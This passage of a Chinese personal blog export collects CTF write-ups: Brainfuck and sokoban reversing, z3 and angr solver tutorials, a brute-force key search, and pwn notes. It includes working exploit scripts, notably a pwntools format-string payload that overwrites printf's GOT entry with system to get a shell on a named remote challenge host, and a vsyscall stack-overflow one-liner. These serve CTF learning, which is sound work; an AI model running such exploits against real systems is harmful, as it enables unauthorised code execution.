lt;]+.&lt;],&gt;.]&gt;--],&gt;++++++++++[&lt;----------&gt;-][[+[.[,++.]&gt;]]-,-]&lt;-[&lt;+&gt;[-][.[+,&gt;-[&lt;[&gt;-[-.&lt;,&gt;].+,]&gt;]]+&gt;[.[.&gt;],.-[,&gt;-[[-&lt;[-&gt;,]-&lt;+]&lt;,]&lt;+&lt;]]]],&gt;++++++++++[&lt;-----&gt;-][&gt;&gt;[++,&lt;]-.,]&lt;----[&lt;+&gt;[-]][+[+&lt;,+[[+.[+[&lt;][++[[&lt;,[[.&gt;,&gt;-]+],&lt;].--]..],,-],&lt;+]++&gt;-]&gt;,,].&gt;.],&gt;+++++++++[&lt;-----------&gt;-]&lt;--[&lt;+&gt;[-]][+.[--,&gt;+],],&gt;++++++++[&lt;------&gt;-][,.-[.,+[&lt;[,[,+[.&gt;[-&gt;+[[+[-],[-,-]-][.+,&lt;[,+.&gt;..]]]]+.-,-]&lt;,]&gt;[+[[,-.,].+]&lt;+.]-,&lt;]+&gt;]-[[&lt;[&lt;.,&lt;+,][&lt;[-[&lt;[&gt;+&lt;&lt;++&lt;]],]]],,-&gt;-]&lt;]&gt;+&lt;]&lt;-------[&lt;+&gt;[-]],&gt;+++++[&lt;--------------------&gt;-]&lt;[&lt;+&gt;[-]][.+.+],&gt;++++++++++[&lt;-----&gt;-][&gt;-,[&gt;.+&lt;--]&lt;.[+[&lt;&lt;[&lt;[--&lt;[-&lt;],.[[-&gt;,.],&gt;&gt;]&lt;.+].,]++]+[&gt;,[[[[.]&lt;-].-,],]]&gt;]&gt;]&lt;--[&lt;+&gt;[-][[.,&gt;-[.&lt;,[&gt;,[,[[-&gt;[[[--&gt;--.]&gt;,-]&gt;.&gt;]],[.&gt;[,[&lt;.,&gt;[+,,+&lt;&lt;.],+]]--[+.,[&gt;-,[+,]--&gt;]+.].,&lt;]]+]++].[&lt;+.].,+].&gt;-],+]],&gt;++++++++[&lt;------------&gt;-]&lt;---[&lt;+&gt;[-]],&gt;++++++[&lt;---------&gt;-]&lt;---[&lt;+&gt;[-][[-&gt;&gt;[+&lt;.[&gt;&gt;-].&lt;,&lt;],]&lt;]],&gt;++++++++[&lt;------&gt;-][&lt;+&lt;.-&gt;]&lt;[&lt;+&gt;[-][[&lt;+,[+.]+]+.[&lt;[.-]&gt;-],]],&gt;+++++[&lt;-----------&gt;-]&lt;-[&lt;+&gt;[-]],&gt;++++++[&lt;--------&gt;-][[--,[&lt;&lt;-[&gt;[,&gt;.[.,-[.+[&lt;,&lt;-.[-],]&gt;]++.],],,,]&lt;.,].&lt;]-[&gt;[.-&lt;,],,.[&lt;[&lt;-,].+]-]&lt;]&lt;----[&lt;+&gt;[-][-.&lt;]],&gt;+++++++++[&lt;-----------&gt;-]&lt;--[&lt;+&gt;[-]][[[&gt;&gt;+[.]&gt;+]]-.],&gt;++++++++[&lt;------------&gt;-]&lt;------[&lt;+&gt;[-]][&gt;-[.+&lt;[.]+.&lt;[[&gt;,[[+.+&gt;]-&lt;.]+[+,&gt;,&gt;-,]]]]&gt;,-[&gt;-&lt;[-,&lt;-&gt;[&lt;.&gt;[+.[.]&gt;,[,[.-]&gt;]&gt;]+&gt;[[&gt;-,]+].]],&lt;[&lt;&lt;..-].]],&gt;++++++++++[&lt;-----&gt;-][[.[&gt;&gt;-[.&gt;.[[..[+,,]&lt;.&gt;[..+..]+&lt;]]]&gt;&gt;&gt;[[--,-],+&gt;.-]-.]&gt;]]&lt;-[&lt;+&gt;[-]],&gt;+++++++++[&lt;-----&gt;-][,[.[...&lt;,&lt;&lt;+,]]-.]&lt;--------[&lt;+&gt;[-]],&gt;++++++++++[&lt;-----&gt;-][[,.-,.]]&lt;-------[&lt;+&gt;[-]][..,[,.[-.&lt;]-,[[&gt;[&gt;[&gt;,&lt;[&gt;&gt;+,[+[[-,]&lt;]&gt;,[++[&lt;,&gt;][&gt;],&gt;]-&gt;&gt;].],&lt;],+.,]-,[-[&gt;,,+][+[,]].-]-&gt;,]]&lt;+&gt;]+[&gt;+.]-],&gt;++++++++[&lt;------------&gt;-][&gt;+&gt;--]&lt;---[&lt;+&gt;[-]][,,&gt;],&gt;+++++++++[&lt;-----&gt;-]&lt;------[&lt;+&gt;[-]],&gt;++++++[&lt;----------------&gt;-]&lt;----[&lt;+&gt;[-]][[[,.],.,-].&lt;,[&lt;,+[&gt;...[&lt;&lt;,[+[,&gt;&gt;[+.-[.+[[&lt;,+][,&lt;,]].,,&gt;][&gt;,..]+&lt;]],,]]&lt;]+,.]],&gt;++++++[&lt;----------------&gt;-]&lt;-----[&lt;+&gt;[-][&lt;.[[.[,-,[.,,]&lt;[&gt;[.[,[-[[.][-&gt;+&lt;].&gt;]&gt;[[,]-.&lt;[&lt;,+..]]+&gt;-]&gt;&gt;[&lt;[-.&gt;-&lt;[+&lt;+&gt;,].&lt;]&lt;[--[&gt;-]],]&gt;]&gt;&gt;[[&gt;.+++]++.]].,&gt;-&lt;]&gt;+]+]-[+++[,,&lt;[,..-[..-]&gt;-],],+]+]+[+&gt;[.-[+[.]]],]&lt;]][.[,,-&gt;+&lt;],],&gt;+++++++[&lt;-------&gt;-][&lt;+&lt;+]&lt;--[&lt;+&gt;[-]],&gt;+++++[&lt;----------&gt;-]&lt;-[&lt;+&gt;[-]][+&gt;[+&lt;,[+[,+[,&lt;&lt;,+,]&lt;.],-&gt;]+&gt;]-],&gt;+++++++++[&lt;----------&gt;-]&lt;-------[&lt;+&gt;[-]][.-&gt;[[&lt;.-.&gt;].+[,[&lt;[,&lt;-[.&gt;],.&gt;+&lt;]+[[[,]],&lt;+++]&gt;-]&lt;-]&gt;+&lt;].&lt;&lt;[-,&gt;&gt;]],&gt;+++++[&lt;-----------&gt;-]&lt;-[&lt;+&gt;[-][,&gt;---]][,-],&gt;++++++++[&lt;------------&gt;-]&lt;-----[&lt;+&gt;[-][.-[[.,-[&gt;[,.+]&gt;],&gt;,[,&gt;-[+&lt;+[[,,[&gt;[&lt;+[+&lt;+,]&gt;-.[-.-.]&lt;.-]++],]&gt;&gt;[[.-,+&gt;]+&lt;-]]&gt;+],.]]--&gt;,-]+&lt;.&lt;]],&gt;++++++++++[&lt;----&gt;-]&lt;---------[&lt;+&gt;[-]][&lt;+[&lt;..]],&gt;+++++++[&lt;--------------&gt;-][&gt;&gt;[[[&gt;-[+[,.--,]--[&gt;[.-&gt;&gt;],.,[.-&gt;]]&lt;.&lt;],-[,+],.]+,&gt;[&gt;-[+&lt;&lt;]&gt;]]--,]---]&lt;---[&lt;+&gt;[-][.-&lt;-[&lt;[,&gt;--.++&lt;].-.&gt;+]]],&gt;+++++++++[&lt;-----------&gt;-]&lt;-[&lt;+&gt;[-]],&gt;+++++++[&lt;--------------&gt;-]&lt;-[&lt;+&gt;[-][[+&gt;.[,]&lt;[&lt;[&gt;,+.-,][&lt;+&gt;[-,,,[&lt;,+[&lt;&lt;+[+.-,[,+]&gt;.+]-[&lt;.&lt;[&gt;.[...-],]+&gt;[-[&gt;---,]&gt;-&lt;[-,]...].]+&lt;][&lt;&lt;[+&lt;-[+&lt;[&gt;-.+&gt;]+,]+&gt;,]]]&lt;,],]&lt;+].--]&lt;]],&gt;++++++[&lt;---------&gt;-]&lt;-[&lt;+&gt;[-][+&gt;[-.&lt;[[+[&gt;,+.,&gt;]&gt;]&gt;[+[++,&gt;[,,[+[.&gt;.[&gt;,]+]&lt;&lt;]-.&gt;]&gt;-].-&gt;++],]&gt;[&gt;[.[&gt;.+],].,[&lt;[-&lt;,[[[-,&gt;]-]+[,,-[.&lt;[+&lt;[&lt;,-,-]+,+][[.,-&gt;]+[--,&lt;+]&gt;]&lt;]+.--],.&gt;]].[--[&gt;.&lt;[[,&gt;...,]-,]&lt;&lt;[[&lt;]&gt;.]&lt;].+&gt;]-]-.]+],]][&gt;,[,-[[..[..,&lt;[.--]-,&gt;]+&lt;[[,.[+[[&lt;+&gt;[+]&lt;&lt;]---[..[,&lt;].],&lt;]]].&gt;]&gt;]-&gt;+],,&gt;[-,.&gt;].]&gt;-&gt;],&gt;+++++[&lt;----------&gt;-]&lt;-[&lt;+&gt;[-]][[[,[,,-,,.][.-&gt;+&lt;],]++&gt;,]-],&gt;+++++[&lt;--------------------&gt;-]&lt;--[&lt;+&gt;[-][-&gt;[-]&lt;[&gt;&gt;-&lt;..].+]][[&gt;]+.+,],&gt;++++++++[&lt;------------&gt;-]&lt;---[&lt;+&gt;[-]],&gt;+++++[&lt;--------------------&gt;-]&lt;--[&lt;+&gt;[-][+[[[,--[[[+.]-&gt;]&lt;-&lt;.][-[-&gt;&gt;&gt;[&lt;[+,&gt;[,+[+]+.&gt;][-..],][,,.[&lt;,-[+]&gt;++]-,+]++]&lt;],].][+,&gt;,-[&lt;,.[&lt;&lt;[-[,&lt;-].[++.[[.--]&gt;-[&lt;&lt;]+],-]-]&gt;,,[&gt;[-[,.&lt;].[[&lt;&lt;&lt;+,]&lt;-]+]-].&lt;].&gt;,]]&lt;]&lt;[[,&lt;[-&gt;].-]--]+]-[+.-]]],&gt;+++++++++[&lt;-----&gt;-]&lt;-------[&lt;+&gt;[-]][.[,&lt;&lt;-&gt;.]&gt;],&gt;++++++++[&lt;------------&gt;-]&lt;--[&lt;+&gt;[-][-[&gt;-,-[&lt;+&gt;,-,]&gt;-,]]][&gt;[-,[.&gt;+.].]-[&lt;+]+..],&gt;++++++[&lt;--------------------&gt;-]&lt;-----[&lt;+&gt;[-]]+&lt;[wronganswer!&gt;[-][+[+[[.[&gt;[+,,[[[+&gt;+&lt;++]+,+],,&gt;&gt;&gt;]+],+.,+].],+,[-,-[.]--,&gt;,-].&lt;][-.[+&lt;[[&gt;[[.,+&lt;-[,..-&gt;],,+]-[.--&lt;]][.[+&gt;,[&lt;[.+&gt;,&gt;.+,],]]+[++]&gt;]&gt;]&gt;]&lt;++[&gt;&gt;&gt;+&gt;-.]&gt;]&gt;]],&gt;.[&lt;,&lt;.]++&lt;]&lt;[-]][&gt;...,]&gt;[congratulations![-][&lt;.+&gt;.+]] 这样看起来就没那么辣眼睛了，并且知道正确的输入应该是71位，把源码编译了之后运行了一波发现是正确的。 那些无效的, .都存在于循环中，所以不进入这些循环就是约束输入的条件。 简化后代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&gt;,&gt;+++++[&lt;--------------------&gt;-]&lt;----104,&gt;+++++[&lt;--------------------&gt;-]&lt;---103,&gt;+++++[&lt;-------------------&gt;-]&lt;--97,&gt;+++++++[&lt;---------------&gt;-]&lt;---109,&gt;+++++++++[&lt;-----------&gt;-]&lt;-101,&gt;++++++++[&lt;---------------&gt;-]&lt;---123,&gt;++++++++[&lt;------------&gt;-]&lt;-----101,&gt;+++++++++[&lt;-----&gt;-]&lt;------51,&gt;++++++[&lt;--------&gt;-]&lt;-----53,&gt;++++++[&lt;----------------&gt;-]&lt;-97,&gt;+++++++++[&lt;-----------&gt;-]&lt;--101,&gt;++++++[&lt;--------&gt;-]&lt;-49,&gt;+++++++[&lt;-------&gt;-]&lt;-50,&gt;+++++++[&lt;-------&gt;-]&lt;49,&gt;+++++[&lt;-----------&gt;-]&lt;-56,&gt;++++++[&lt;---------&gt;-]&lt;---57,&gt;++++++[&lt;----------------&gt;-]&lt;-97,&gt;+++++[&lt;---------&gt;-]&lt;---48,&gt;++++++[&lt;----------------&gt;-]&lt;--98,&gt;++++++[&lt;--------&gt;-]&lt;48,&gt;+++++++++[&lt;------&gt;-]&lt;--56,&gt;++++++++++[&lt;-----&gt;-]&lt;-51,&gt;+++++++[&lt;-------&gt;-]&lt;49,&gt;++++++++++[&lt;---------&gt;-]&lt;-------97,&gt;++++++[&lt;--------&gt;-]&lt;---51,&gt;++++++[&lt;--------&gt;-]&lt;--50,&gt;++++++++[&lt;-------&gt;-]&lt;-57,&gt;++++++++[&lt;------------&gt;-]&lt;---99,&gt;++++++++[&lt;------------&gt;-]&lt;------102,&gt;+++++++[&lt;--------&gt;-]&lt;56,&gt;+++++++[&lt;-------&gt;-]&lt;-----54,&gt;+++++++[&lt;--------------&gt;-]&lt;98,&gt;++++++++++[&lt;-----&gt;-]&lt;-51,&gt;++++++++++[&lt;-----&gt;-]&lt;-----55,&gt;++++++++++[&lt;----------&gt;-]&lt;-101,&gt;++++++++++[&lt;-----&gt;-]&lt;----54,&gt;+++++++++[&lt;-----------&gt;-]&lt;--101,&gt;++++++++[&lt;------&gt;-]&lt;-------55,&gt;+++++[&lt;--------------------&gt;-]&lt;100,&gt;++++++++++[&lt;-----&gt;-]&lt;--52,&gt;++++++++[&lt;------------&gt;-]&lt;---99,&gt;++++++[&lt;---------&gt;-]&lt;---57,&gt;++++++++[&lt;------&gt;-]&lt;48,&gt;+++++[&lt;-----------&gt;-]&lt;-56,&gt;++++++[&lt;--------&gt;-]&lt;----52,&gt;+++++++++[&lt;-----------&gt;-]&lt;--101,&gt;++++++++[&lt;------------&gt;-]&lt;------102,&gt;++++++++++[&lt;-----&gt;-]&lt;-51,&gt;+++++++++[&lt;-----&gt;-]&lt;--------53,&gt;++++++++++[&lt;-----&gt;-]&lt;-------57,&gt;++++++++[&lt;------------&gt;-]&lt;---99,&gt;+++++++++[&lt;-----&gt;-]&lt;------51,&gt;++++++[&lt;----------------&gt;-]&lt;----100,&gt;++++++[&lt;----------------&gt;-]&lt;-----101,&gt;+++++++[&lt;-------&gt;-]&lt;--51,&gt;+++++[&lt;----------&gt;-]&lt;-51,&gt;+++++++++[&lt;----------&gt;-]&lt;-------97,&gt;+++++[&lt;-----------&gt;-]&lt;-56,&gt;++++++++[&lt;------------&gt;-]&lt;-----101,&gt;++++++++++[&lt;----&gt;-]&lt;---------49,&gt;+++++++[&lt;--------------&gt;-]&lt;---101,&gt;+++++++++[&lt;-----------&gt;-]&lt;-100,&gt;+++++++[&lt;--------------&gt;-]&lt;-99,&gt;++++++[&lt;---------&gt;-]&lt;-55,&gt;+++++[&lt;----------&gt;-]&lt;-51,&gt;+++++[&lt;--------------------&gt;-]&lt;--102,&gt;++++++++[&lt;------------&gt;-]&lt;---99,&gt;+++++[&lt;--------------------&gt;-]&lt;--102,&gt;+++++++++[&lt;-----&gt;-]&lt;-------52,&gt;++++++++[&lt;------------&gt;-]&lt;--98,&gt;++++++[&lt;--------------------&gt;-]&lt;-----125 后面的数字就是要求输入的字符的ASCII码值，得到flag。 手动全弄一遍也太爽了🎱","categories":[],"tags":[]},{"title":"NCTF2018","slug":"NCTF2018","date":"2018-11-26T09:07:04.000Z","updated":"2019-02-12T16:01:00.709Z","comments":true,"path":"2018/11/26/NCTF2018/","link":"","permalink":"http://yoursite.com/2018/11/26/NCTF2018/","excerpt":"说是不再记录简单题的，无奈能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。","text":"说是不再记录简单题的，无奈能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。 someboxes那一题看了很久一直没有一个具体的感觉，后来发现就是推箱子游戏，输入w450控制方向把两个箱子推到目标点就行了，不过地图还是有一些小问题，要看wp才能得到解答。 babystack开了pie，看了网上的教程说可以只覆盖后四位，因为pie不会改变最后三位，所以多试几次肯定会成功，但是输入限制了必需要为8的倍数，与部分覆盖产生了冲突，不知道怎么解决。 smallbug3也开了pie，先输入接下来接受的输入的长度，要求不大于128，感觉可以输入一个负数的十六进制的表达的形式那种来形成栈溢出，好像也成功了，但是这题不知道怎么泄漏libc基址，后来也就没做。 someboxes看了源码之后终于知道了地图哪里出了问题，原来地图中的每个数值都与下标异或了，再异或一次得到真正的地图。当时没看程序中有哪些地方对地图进行了操作（准确的说是看了但是没看见最底下有一个改写地图的orz。 地图： 123456789101112[* * * * * * * * * * * * * * * * * * 0 0 * * * * * * * * 0 0 * * * * 0 0 0 x 0 * 0 0 0 0 0 0 * * * * 0 * * 0 0 0 0 0 * * * 0 0 * * * 0 * * 0 * * 0 0 * @ 0 0 0 * * * 0 0 * 0 0 0 P 0 * * * * * * * * 0 0 * * * * 0 * * * * * * * * * 0 * * * * * X * * 0 0 0 * * * 0 0 * @ * 0 * 0 0 0 0 * 0 * * * 0 0 0 0 0 0 0 0 * * * * 0 * * * 0 0 0 0 * * * 0 * 0 0 0 0 * * * * * * * * * * * * * * * * * *] 玩家初始的位置用P表示，两个箱子用x表示，终点用@表示，不能推到*上，所以沿着0推就行了。 操作顺序：aaawwdwaaawasssssssasddsdwwddddwwwwwaaawwdddsdwawddddwdssdsaa 用W540替换：444Wd0W444W4555555545d0d05d0Wd0d0d0d0W444Wd0d0d05d0W4Wd0d0d0d0Wd055d0544 输入这个应该就可以得到flag了。 babystack看了github上的脚本： 1234from pwn import *p=process(&apos;./babystack&apos;)p.sendline(p64(0xffffffffff600000)*5)p.interactive() orz其实完全不懂为啥，问了大佬然而大佬没看题目，后来偶然在群里看见有人说是vsyscall啥的，百度了一波，结果找到了之前就看过的一篇有关pie的教程。 如果仔细看看的话，在第三部分就能发现对vsyscall的介绍啥的…… 1#define VSYSCALL_ADDR_vgettimeofday 0xffffffffff600000 脚本中0xffffffffff600000就是调用gettimeofday函数吧。 题目源码： 123456789101112131415161718void vul()&#123; char a[10]; int n = readn(a,256); if(n%8 != 0) exit(0); return ;&#125;void func()&#123; vul(); exit(0);&#125;int main()&#123; func(); system(&quot;/bin/sh&quot;);&#125; 栈溢出一直覆盖到exit的返回地址之前，然后执行完vsyscall之后就会往下执行system(&quot;/bin/sh&quot;)了吧。","categories":[],"tags":[]},{"title":"格式化字符串","slug":"格式化字符串","date":"2018-11-21T06:37:21.000Z","updated":"2019-01-12T14:36:07.214Z","comments":true,"path":"2018/11/21/格式化字符串/","link":"","permalink":"http://yoursite.com/2018/11/21/格式化字符串/","excerpt":"","text":"printf()函数如果没有给定格式化参数，就可以利用它来任意读写。像是带canary保护的程序，可以调试一下看一下canary在栈中的位置，然后用%位置$x这样的形式来读取canary。 利用%num$n的形式可以进行任意写（num的取值一般从栈中第一个可以控制的位置开始）。例如\\x02\\x03\\x04\\x08%num$n就是在0x08040302的位置写上4，因为\\x02\\x03\\x04\\x08是四个字节。如果想多写一点的话可以用\\x02\\x03\\x04\\x08%12c%num$n这样的，就有16个字节，就写上了10（十六进制表示）。 例如whalectf上的pwn3: 利用格式化字符串，把printf的got表覆盖为system函数，这样下次调用printf的时候就是调用system函数了。但是%n的话是一次性写4个字节，会发送很多数据，因为每多写1就要多发送一个字节。可以使用%hhn对一个字节进行写。这里system_plt的第一个字节是0x10，而前面payload正好已经发送了16个字节，所以就不需要再添加字节，直接%7$hhn就行了。至于第一个可控制的位置，可以先调试一下程序，发送一下AAAAAAAAA，然后看栈里的数据就很容易知道是7了。 123456789101112131415161718192021from pwn import *sh=remote(&quot;bamboofox.cs.nctu.edu.tw&quot;,22003)printf_got=0x0804a00csystem_plt=0x08048410payload=p32(printf_got)payload+=p32(printf_got+1)payload+=p32(printf_got+2)payload+=p32(printf_got+3)payload+=&quot;%7$hhn&quot;payload+=&quot;%&quot;payload+=str(0x84-0x10)payload+=&quot;c%8$hhn&quot;payload+=&quot;%&quot;payload+=str(0x104-0x84)payload+=&quot;c%9$hhn&quot;payload+=&quot;%&quot;payload+=str(0x08-0x04)payload+=&quot;c%10$hhn&quot;sh.sendline(payload)sh.sendline(&quot;/bin/sh&quot;)sh.interactive()","categories":[],"tags":[]},{"title":"z3求解","slug":"z3求解","date":"2018-11-20T03:00:15.000Z","updated":"2019-01-12T14:37:04.377Z","comments":true,"path":"2018/11/20/z3求解/","link":"","permalink":"http://yoursite.com/2018/11/20/z3求解/","excerpt":"","text":"之前有题应该使用z3求解的一直没有完成，今天就好好学习一下z3，把这题解决了顺便记录一下z3求解的使用！ z3求解大致模版： 123456from z3 import *x=Int(&apos;x&apos;) //定义变量solver=Solver() //构造求解器solver.add(x==1)//添加约束条件if solver.check()==sat: //如果有解返回值为sat否则返回unsat print solver.model() //打印解 之前一题的z3使用分析： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from z3 import *num=BitVec(&quot;num&quot;,33) //这里定义了num为一个32位的二进制数字，至于为什么要写33，是我尝试了很多次无解后发现写33就有解了2333array=[ 164, 25, 4, 130, 126, 158, 91, 199, 173, 252, 239, 143, 150, 251, 126, 39, 104, 104, 146, 208, 249, 9, 219, 208, 101, 182, 62, 92, 6, 27, 5, 46]b=range(32)for i in range(32): temp=0 for j in range(i): temp^=array[j] b[i]=tempsolver=Solver()solver.add(array[0]^(num&amp;0xff)^b[0]==ord(&apos;F&apos;)). //根据题目添加条件solver.add(array[1]^((num&gt;&gt;1)&amp;0xff)^b[1]==ord(&apos;L&apos;))solver.add(array[2]^((num&gt;&gt;2)&amp;0xff)^b[2]==ord(&apos;A&apos;))solver.add(array[3]^((num&gt;&gt;3)&amp;0xff)^b[3]==ord(&apos;G&apos;))solver.add(array[4]^((num&gt;&gt;4)&amp;0xff)^b[4]==ord(&apos;&#123;&apos;))for i in range(5,31): //多次重复的输入可以用循环来操作 solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&lt;=90) solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&gt;=65)solver.add(array[31]^((num&gt;&gt;31)&amp;0xff)^b[31]==ord(&apos;&#125;&apos;))if solver.check()==sat : print solver.model() //得到正确的num 这种简单的z3求解的运用不是很难，但是却比爆破之类的方法来的快很多。其实今天也没学习多少有关z3的，之前一直无解只有因为定义的时候没用33……","categories":[],"tags":[]},{"title":"basic-re-su","slug":"basic-re-su","date":"2018-11-07T13:19:32.000Z","updated":"2018-11-07T13:25:43.950Z","comments":true,"path":"2018/11/07/basic-re-su/","link":"","permalink":"http://yoursite.com/2018/11/07/basic-re-su/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199v4 = 2; v5 = 3; v6 = 2; v7 = 1; v8 = 4; v9 = 7; v10 = 4; v11 = 5; v12 = 10; v13 = 11; v14 = 10; v15 = 9; v16 = 14; v17 = 15; v18 = 12; v19 = 13; v20 = 16; v21 = 19; v22 = 16; v23 = 17; v24 = 20; v25 = 23; v26 = 22; v27 = 19; v28 = 28; v29 = 25; v30 = 30; v31 = 31; v32 = 28; v33 = 25; v34 = 26; v35 = 31; v36 = 36; v37 = 33; v38 = 34; v39 = 39; v40 = 36; v41 = 33; v42 = 34; v43 = 35; v44 = 40; v45 = 41; v46 = 46; v47 = 43; v48 = 36; v49 = 45; v50 = 38; v51 = 47; v52 = 56; v53 = 49; v54 = 58; v55 = 59; v56 = 52; v57 = 61; v58 = 62; v59 = 55; v60 = 48; v61 = 57; v62 = 50; v63 = 59; v64 = 60; v65 = 53; v66 = 54; v67 = 55; v68 = 72; v69 = 73; v70 = 66; v71 = 66; v72 = 68; v73 = 68; v74 = 70; v75 = 71; v76 = 72; v77 = 73; v78 = 74; v79 = 74; v80 = 77; v81 = 77; v82 = 79; v83 = 78; v84 = 80; v85 = 80; v86 = 82; v87 = 83; v88 = 85; v89 = 84; v90 = 86; v91 = 87; v92 = 89; v93 = 89; v94 = 90; v95 = 91; v96 = 92; v97 = 93; v98 = 94; v99 = 94; v100 = 96; v101 = 96; v102 = 99; v103 = 99; v104 = 100; v105 = 101; v106 = 103; v107 = 103; v108 = 105; v109 = 105; v110 = 107; v111 = 107; v112 = 108; v113 = 109; v114 = 110; v115 = 110; v116 = 112; v117 = 112; v118 = 114; v119 = 115; v120 = 116; v121 = 117; v122 = 119; v123 = 119; v124 = 120; v125 = 121; v126 = 123; v127 = 123; v128 = 125; v129 = 125; v130 = 127; v131 = 127; v132 = 129; v133 = 129; v134 = 131; v135 = 131; v136 = 140; v137 = 141; v138 = 142; v139 = 143; v140 = 136; v141 = 137; v142 = 138; v143 = 139; v144 = 140; v145 = 141; v146 = 142; v147 = 135; v148 = 152; v149 = 145; v150 = 146; v151 = 147; v152 = 148; v153 = 149; v154 = 150; v155 = 151; v156 = 152; v157 = 153; v158 = 154; v159 = 154; v160 = 156; v161 = 156; v162 = 158; v163 = 158; v164 = 160; v165 = 160; v166 = 162; v167 = 162; v168 = 164; v169 = 164; v170 = 166; v171 = 166; v172 = 168; v173 = 168; v174 = 170; v175 = 170; v176 = 172; v177 = 172; v178 = 174; v179 = 174; v180 = 176; v181 = 177; v182 = 178; v183 = 179; memset(v184, 0, 0x1Fui64); sub_140011159(std::cout, &quot;flag format: SUCTF&#123;xxxxxxxxxxxxxxx&#125;\\n&quot;); sub_140011159(std::cout, &quot;Please Input Key:&quot;); std::basic_istream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&gt;&gt;(std::cin, &amp;v186); v186 %= 0x10000u; v185 = 8; while ( v185 ) &#123; --v185; for ( j = 22; j; v184[j] |= v189 &lt;&lt; v185 ) &#123; v188 = *(&amp;v4 + 22 * v185 + --j); v189 = (v188 &gt;&gt; ((v186 &gt;&gt; 2 * v185) &amp; 3)) &amp; 1; &#125; &#125; sub_140011159(std::cout, v184); system(&quot;pause&quot;); sub_1400113A7((__int64)&amp;v3, (__int64)&amp;unk_14001AD10); return 0i64; 这一题很简单，只是在爆破的时候遇到几个坑(因为自己的鶸），所以记录一下。 程序流程就是输入一个key，大小为0x0001~0xffff。经过运算后输出v184，给了flag格式直接爆破就是了。 但是ida初始化是，v4后面大于127的值都默认显示成了负数，这样是爆破不出来的，按两次h转换成正数。 其他就是爆破时的逻辑了，基本上照着原代码copy就行了。 爆破脚本： 1234567891011value=[2,3,2,1,4,7,4,5,10,11,10,9,14,15,12,13,16,19,16,17,20,23,22,19,28,25,30,31,28,25,26,31,36,33,34,39,36,33,34,35,40,41,46,43,36,45,38,47,56,49,58,59,52,61,62,55,48,57,50,59,60,53,54,55,72,73,66,66,68,68,70,71,72,73,74,74,77,77,79,78,80,80,82,83,85,84,86,87,89,89,90,91,92,93,94,94,96,96,99,99,100,101,103,103,105,105,107,107,108,109,110,110,112,112,114,115,116,117,119,119,120,121,123,123,125,125,127,127,129,129,131,131,140,141,142,143,136,137,138,139,140,141,142,135,152,145,146,147,148,149,150,151,152,153,154,154,156,156,158,158,160,160,162,162,164,164,166,166,168,168,170,170,172,172,174,174,176,177,178,179]for key in range(0xffff): flagnc=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0] for i in range(7,-1,-1): for j in range(21,-1,-1): v188=value[22*i+j] v189=(v188&gt;&gt;((key&gt;&gt;2*i)&amp;3))&amp;1 flagnc[j]|=v189&lt;&lt;i flag=&quot;&quot;.join([chr(ch) for ch in flagnc]) if ~flag.find(&quot;SUCTF&#123;&quot;): print flag","categories":[],"tags":[]},{"title":"符号执行Angr","slug":"符号执行Angr","date":"2018-11-03T14:57:50.000Z","updated":"2018-11-04T06:26:08.670Z","comments":true,"path":"2018/11/03/符号执行Angr/","link":"","permalink":"http://yoursite.com/2018/11/03/符号执行Angr/","excerpt":"","text":"突然发现记录一些简单题的做题过程只会浪费时间，以后就不记录特别简单的题了（虽然难的题也不会写XD 今天在做whalectf上面的题目时，有两道类型差不多的题，但是一道用爆破解出来了，另一道)却解不出来，查找writeup的时候找不到一样的题目，但是找到了类似的题目，并且发现了符号执行这个东西，学习后掌握了新的解题技巧。 首先要安装angr库，具体操作方法可以百度。 解题脚本： 12345678import angr import claripy p = angr.Project(&quot;./ais3_crackme&quot;) argv1=claripy.BVS(&apos;argv1&apos;,24*8)state=p.factory.entry_state(args=[&apos;./ais3_crackme&apos;,argv1])simgr=p.factory.simgr(state)simgr.explore(find=0x400602,avoid=0x40060e)print simgr.found[0].solver.eval(argv1,cast_to=str) 其中： p = angr.Project(&quot;./ais3_crackme&quot;) 为每一个angr脚本必备 argv1=claripy.BVS(&#39;argv1&#39;,24*8) 是以二进制形式设一个参数，ida分析程序得知参数长度为24 state=p.factory.entry_state(args=[&#39;./ais3_crackme&#39;,argv1]) 获取程序的初始状态 simgr=p.factory.simgr(state) 遍历路径 simgr.explore(find=0x400602,avoid=0x40060e) 设定成功与失败的路径结果，地址由ida分析得 print simgr.found[0].solver.eval(argv1,cast_to=str) 以字符串形式输出结果 这一题几乎是照抄着写了一遍，因此再把之前那道简单的题)拿出来练一下手。 脚本如下： 123456import angr p = angr.Project(&quot;./r100&quot;) state=p.factory.entry_state(args=[&apos;./r100&apos;])simgr=p.factory.simgr(state)simgr.explore(find=0x400844,avoid=0x400855)print simgr.found[0].posix.dumps(0) 但还是不太熟练，可至少拥有了两个简单的模版XD 再摘录一下freebuf上的较通用脚本： 12345678910111213141516171819202122232425262728293031import angrimport sysprint &quot;[*]start------------------------------------&quot;p = angr.Project(sys.argv[1]) # 建立工程初始化二进制文件state = p.factory.entry_state() # 获取入口点处状态&apos;&apos;&apos;state.posix.files[0].read_from(1)表示从标准输入读取一个字节&apos;&apos;&apos;for _ in xrange(int(sys.argv[2])): # 对输入进行简单约束（不为回车） k = state.posix.files[0].read_from(1) state.se.add(k!=10)k = state.posix.files[0].read_from(1)state.se.add(k==10) # 回车为结束符state.posix.files[0].seek(0)state.posix.files[0].length = int(sys.argv[2])+1 # 约束输入长度（大于实际长度也可）print &quot;[*]simgr start-------------------------------&quot;sm = p.factory.simgr(state) # 初始化进程模拟器sm.explore(find=lambda s:&quot;correct!&quot; in s.posix.dumps(1)) # 寻找运行过程中存在 “correct！”的路径，并丢弃其他路径print &quot;[*]program excuted---------------------------&quot;for pp in sm.found: out = pp.posix.dumps(1) # 表示程序的输出 print out inp 